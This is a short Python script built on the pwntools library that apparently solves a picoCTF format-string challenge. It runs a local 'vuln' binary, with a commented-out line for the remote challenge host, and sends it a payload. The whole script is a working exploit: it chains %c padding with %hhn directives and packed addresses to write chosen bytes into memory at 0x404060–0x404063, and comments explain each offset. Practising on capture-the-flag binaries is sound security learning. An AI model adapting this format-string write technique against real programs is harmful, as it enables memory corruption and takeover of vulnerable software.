#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("vuln")
p = process()
#p = gdb.debug("./vuln","break *(main)")
#p = remote("rhea.picoctf.net", "55702")


p.recvuntil(b"\n")

payload = b"%74c" #74 characters printed + 23 characters below gives us 0x61 characters which is the lowest number in our suspicious number
payload += b"%c"*23
payload += b"%hhn" #write 0x61 to 0x404062
payload += b"%5c" #print another 5 width character to get to next number (0x66)
payload += b"%26$hhn" #write it to argument 26 (0x404060 on the stack)
payload += b"%1c" #another offset to get to the next number
payload += b"%27$hhn" #write to argument 27
payload += b"%5c"
payload += b"%28$hhn"
payload += b"AAAA" #padding to keep our addresses clean
payload += p64(0x404062) #61
payload += p64(0x404060) #66
payload += p64(0x404063) #67
payload += p64(0x404061) #6c


p.sendline(payload)
d = p.recvline()
print(d)
d = p.recvline()
print(d)
d = p.recvall()
print(d.decode("utf-8"))

